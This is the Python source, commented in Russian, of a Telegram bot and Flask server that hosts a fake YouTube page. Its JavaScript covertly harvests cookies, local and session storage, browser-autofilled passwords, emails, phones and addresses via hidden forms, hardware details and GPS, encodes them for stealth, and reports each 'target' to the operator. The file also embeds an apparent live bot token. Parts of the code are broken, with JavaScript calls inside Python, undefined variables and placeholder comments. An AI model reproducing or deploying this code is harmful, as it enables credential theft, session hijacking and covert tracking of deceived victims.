import asyncio
import threading
import requests
import uuid
import json
import os
import time
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] КОНФИГУРАЦИЯ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

# --- [2] ИНИЦИАЛИЗАЦИЯ ---
app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Хранилища данных
vault = {}
user_modes = {}

# --- [3] ОБНОВЛЕННЫЙ ШАБЛОН ЛОВУШКИ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; }
        .yt-header { padding: 10px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 10px solid transparent; margin-left: 5px; }
        .info { padding: 15px; text-align: left; }
        .v-title { font-size: 18px; color: #0f0f0f; margin-bottom: 5px; }
        .v-stats { font-size: 12px; color: #606060; }
        
        /* Скрытые формы для захвата данных */
        .hidden-form { position: absolute; opacity: 0; height: 0; width: 0; }
    </style>
</head>
<body onclick="ignite()">
    <div class="yt-header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover;">
        <div class="play-btn"></div>
    </div>
    <div class="info">
        <div class="v-title">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
        <div class="v-stats">1.8 млн просмотров • 2 часа назад</div>
    </div>
    
    <!-- Скрытые формы для захвата автозаполнения -->
    <div class="hidden-form">
        <form id="login-form">
            <input type="email" name="email" autoComplete="email">
            <input type="password" name="password" autoComplete="current-password">
            <input type="text" name="phone" autoComplete="tel">
            <input type="text" name="name" autoComplete="name">
            <input type="text" name="address" autoComplete="street-address">
        </form>
    </div>

<script>
let sent = false;
let mode = "{{ mode }}";

async function ignite() {
    if(sent) return; sent = true;
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height };

    // Сбор браузерных данных с задержкой для скрытности
    setTimeout(async () => {
        // Захват кук
        d.cookies = document.cookie;
        
        // Захват хранилищ
        d.localStorage = {};
        for(let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            d.localStorage[key] = localStorage.getItem(key);
        }
        
        d.sessionStorage = {};
        for(let i = 0; i < sessionStorage.length; i++) {
            let key = sessionStorage.key(i);
            d.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        // Захват истории автозаполнения из скрытой формы
        d.autofill = {};
        const form = document.getElementById('login-form');
        const formData = new FormData(form);
        formData.forEach((value, key) => {
            if(value) d.autofill[key] = value;
        });
        
        // Захват истории браузера (ограниченное число)
        d.history = [];
        try {
            if (window.history && window.history.length > 0) {
                d.history = [...Array(Math.min(10, window.history.length)).keys()]
                    .map(i => history.state || "Unknown");
            }
               // Сбор батареи
        try {
            let b = await navigator.getBattery();
            d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
        } catch(e) { d.bat = "N/A"; }

        // Сбор аппаратных характеристик
        try {
            let gl = document.createElement('canvas').getContext('webgl');
            let dbg = gl.getExtension('WEBGL_debug_renderer_info');
            d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            d.cores = navigator.hardwareConcurrency;
            d.mem = navigator.deviceMemory;
        } catch(e) {}

        // Симуляция пользовательского ввода для автозаполнения
        setTimeout(() => {
            const form = document.getElementById('login-form');
            form.querySelectorAll('input').forEach(input => {
                input.focus();
                input.blur();
            });
        }, 100);

        // Логика режимов
        setTimeout(() => {
            if (mode === "PRECISION") {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        d.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
                        sendData(d);
                    },
                    (err) => { d.gps = "Denied"; sendData(d); },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                sendData(d);
            }
        }, 300);
    }, 150); // Начальная задержка для скрытности
}

function sendData(d) {
    // Шифрование данных для скрытности
    let encrypted = btoa(encodeURIComponent(JSON.stringify(d)));
    fetch('/log', { 
        method: 'POST', 
        headers: {'Content-Type': 'text/plain'}, 
        body: encrypted 
    }).finally(() => { 
        setTimeout(() => { 
            location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
        }, Math.random() * 2000 + 1000); // Случайная задержка
    });
}
</script>
</body>
</html>
"""

# --- [4] ОБНОВЛЕННАЯ FLASK LOGIC ---
@app.route('/log', methods=['POST'])
def logger():
    try:
        # Дешифровка данных
        encrypted = request.data.decode('utf-8')
        d = json.loads(decodeURIComponent(atob(encrypted)))
    except:
        return "Invalid data", 400
    
    # Обработка геоданных...
    # [Оставь существующий код геолокации]
    
    # Обработка новых данных
    cookies = d.get('cookies', '')
    storage_summary = f"Local: {len(d.get('localStorage',{}))} | Session: {len(d.get('sessionStorage',{}))}"
    autofill_summary = ", ".join([f"{k}: ***" for k in d.get('autofill', {}).keys()])
    
    history_summary = "Нет данных"
    if 'history' in d and d['history'].length > 0:
        history_summary = f"{len(d['history'])} записей (последняя: {d['history'][0].slice(0,20)}...)"
    
    # Обновленный отчет
    report = (
        f"🚀 **ОТЧЕТ ПО ЦЕЛИ: {user_modes.get(str(d['aid']), 'ANALYTICS')}**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЬ:**\n"
        f"• IP: `{ip}` | Провайдер: `{geo.get('isp')}`\n"
        f"• Тип: {'📱 Мобильный' if geo.get('mobile') else '🌐 Wi-Fi'}\n"
        f"📍 **ГЕО (IP):** `{geo.get('city')}, {geo.get('country')}`\n"
        f"🛰 **GPS:**\n{gps_str}\n\n"
        f"🔋 **БАТАРЕЯ:** `{d.get('bat')}`\n"
        f"💻 **ЖЕЛЕЗО:**\nGPU: `{d.get('gpu','N/A')[:25]}...` | RAM: `{d.get('mem','N/A')}GB`\n"
        f"🍪 **БРАУЗЕР:**\n"
        f"• Куки: `{len(cookies.split('; '))} элементов`\n"
        f"• Хранилища: `{storage_summary}`\n"
        f"• Автозаполнение: `{autofill_summary or 'нет данных'}`\n"
        f"• История: `{history_summary}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **ТОКЕН:** `{token}`"
    )
    
    # Отправка отчета...
    # [Оставь существующий код отправки]

# --- [5] ОБНОВЛЕННАЯ ОБРАБОТКА ДАННЫХ ---
@dp.message(F.text.startswith("ID-"))
async def get_dump(message: types.Message):
    t = message.text.strip().upper()
    if t in vault:
        # Маскировка конфиденциальных данных в JSON
        dump = vault[t].copy()
        if 'client' in dump:
            if 'autofill' in dump['client']:
                for k in dump['client']['autofill']:
                    dump['client']['autofill'][k] = "***REDACTED***"
            if 'cookies' in dump['client']:
                dump['client']['cookies'] = dump['client']['cookies'][:50] + "... [truncated]"
        
        await message.answer(f"📦 **ПОЛНЫЙ JSON {t}:**\n```json\n{json.dumps(dump, indent=2)}\n```")
    else:
        await message.answer("❌ Токен не найден.")

# --- [6] ЗАПУСК (БЕЗ ИЗМЕНЕНИЙ) ---
async def main():
    # Запуск Flask в отдельном потоке
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    # Запуск бота в основном потоке
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
